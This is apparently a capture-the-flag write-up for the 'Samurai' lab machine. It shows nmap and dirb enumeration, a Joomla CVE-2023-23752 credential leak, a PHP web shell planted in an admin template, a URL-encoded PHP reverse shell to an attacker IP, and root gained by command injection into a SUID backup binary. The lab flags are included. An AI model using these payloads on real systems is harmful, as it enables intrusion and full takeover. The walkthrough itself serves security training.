---
title: Samurai HS Write-Up
machine_ip: 10.1.106.88
os: Linux
difficulty: Easy
my_rating: 4
tags:
  - writeup
references: "[[📚CTF Box Writeups]]"
date: 2026-07-21
---
## 🌐 Enumeration
```bash
❯ nmap -sSVC -p- --open 10.1.106.88
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-21 09:22 -0700
Nmap scan report for 10.1.106.88
Host is up (0.12s latency).
Not shown: 65531 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c3:5a:83:50:80:9a:61:37:05:b7:45:96:cb:ab:1d:1e (ECDSA)
|_  256 6b:15:12:60:1b:21:d1:bf:7e:b8:c0:e8:d7:7e:7b:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Samurai
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.59 seconds
```

`http://10.1.106.88/README.txt` is discovered and includes the Joomla version (Joomla 4.2)

Enumerating exploits for this version of Joomla, we find CVE-2023-23752. Using this exploit (https://github.com/Acceis/exploit-CVE-2023-23752), we enumerate the mysql database info running locally on the machine
	`joomla425 : Pa847word987@Joomla456`
	Database: `Dbjoomla`
	Super User: `Oda (Miyamotao) - oda@local.local`

```bash
❯ ruby exploit.rb http://10.1.106.88
Users
[769] Oda (Miyamoto) - oda@local.local - Super Users

Site info
Site name: Samurai
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: joomla425
DB password: Pa847word987@Joomla456
DB name: Dbjoomla
DB prefix: iemj4_
DB encryption 0
```

Dirbusting again, we find an `/administrator` directory
```bash
❯ dirb http://samurai.hs           
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Tue Jul 21 09:56:00 2026
URL_BASE: http://samurai.hs/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612                                                          
---- Scanning URL: http://samurai.hs/ ----
==> DIRECTORY: http://samurai.hs/administrator/
==> DIRECTORY: http://samurai.hs/api/
==> DIRECTORY: http://samurai.hs/assets/
==> DIRECTORY: http://samurai.hs/cache/
==> DIRECTORY: http://samurai.hs/components/
==> DIRECTORY: http://samurai.hs/images/
==> DIRECTORY: http://samurai.hs/includes/
==> DIRECTORY: http://samurai.hs/language/
==> DIRECTORY: http://samurai.hs/layouts/ 
```

We successfully log into the `http://samurai.hs/administrator` page using credentials disclosed from the joomla 4.2 exploit
	`miyamoto : Pa847word987@Joomla456`

With access to templates, we can modify them to run PHP code (we also noticed PGP warning message when we logged in stating PHP version is old)

 The `index.php` webpage in the `atum` template (Admin Panel) is easily accessible so we will modify this site template:
 ```php
 ...
 <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
</body>
</html>
 ```
Browsing to `http://samurai.hs/administrator/index.php?cmd=whoami` reveals we have RCE and are running commands as `www-data`.

## 🗝️ Initial Access


Get a reverse shell by putting a php reverse shell in the `cmd` attribute we just added:
```html
http://samurai.hs/administrator/index.php?cmd=php%20-r%20%27$s=fsockopen(%2210.200.73.51%22,1234);proc_open(%22sh%22,[$s,$s,$s],$p);%27
```

Obtained shell as `www-data`, obtain flag:
```bash
www-data@streetcoder:/var/www$ cat user.txt
flag{Tachi_794–1185}
```

Enumerate the database using the database credentials obtained via CVE-2023-23752
```bash
www-data@streetcoder:/tmp$ mysql -h 127.1 -u joomla425 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 4914
Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show database;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'database' at line 1
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| Dbjoomla           |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)
```

Nothing new...
## ⚡ Privilege Escalation

SUID check:
```bash
www-data@streetcoder:/tmp$ find / -perm -u=s -type f 2>/dev/null
/opt/backup/DbMaria

www-data@streetcoder:/tmp$ strings /opt/backup/DbMaria 
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
__libc_start_main
system
setuid
snprintf
__stack_chk_fail
libc.so.6
GLIBC_2.2.5
GLIBC_2.4
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Usage: %s <database>
mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql
```

Perform command injection on this binary that runs as root:
```bash
www-data@streetcoder:/tmp$ sudo /opt/backup/DbMaria 'test; /bin/bash -p #'
/*M!999999\- enable the sandbox mode */ 
-- MariaDB dump 10.19  Distrib 10.6.23-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: test
-- ------------------------------------------------------
-- Server version       10.6.23-MariaDB-0ubuntu0.22.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
mariadb-dump: Got error: 1049: "Unknown database 'test'" when selecting the database
root@streetcoder:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Get root flag:
```bash
root@streetcoder:~# cat root.txt 
flag{Katana_1603–1868}
```